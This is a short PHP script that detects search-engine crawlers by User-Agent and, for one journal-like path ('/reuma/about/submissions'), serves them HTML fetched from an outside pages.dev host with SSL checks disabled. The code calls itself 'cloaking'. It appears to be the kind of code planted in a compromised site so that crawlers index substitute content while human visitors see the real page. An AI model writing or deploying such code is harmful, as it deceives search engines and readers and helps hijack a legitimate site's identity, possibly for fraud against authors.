<?php
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$userAgent  = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

$botSignatures = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot',
    'baiduspider', 'yandex', 'crawler', 'spider'
];

function isBot(string $ua, array $signatures): bool {
    foreach ($signatures as $bot) {
        if (strpos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function fetchContent(string $url): string {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; PHP script)'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result !== false ? $result : "Cloaked content failed to 
load.";
}

$routes = [
    '/reuma/about/submissions' => 'https://reumatismo-org.pages.dev/',
];

foreach ($routes as $path => $url) {
    if (strpos($requestUri, $path) !== false && isBot($userAgent, 
$botSignatures)) {
        header("Content-Type: text/html; charset=UTF-8");
        echo fetchContent($url);
        exit;
    }
}
// Routing cloaking
if (strpos($requestUri, '/reuma/about/submissions') !== false && isBot($userAgent, 
$botSignatures)) {
    header("Content-Type: text/html; charset=UTF-8");
    echo 
fetchContent('https://reumatismo-org.pages.dev/');
    exit;
}
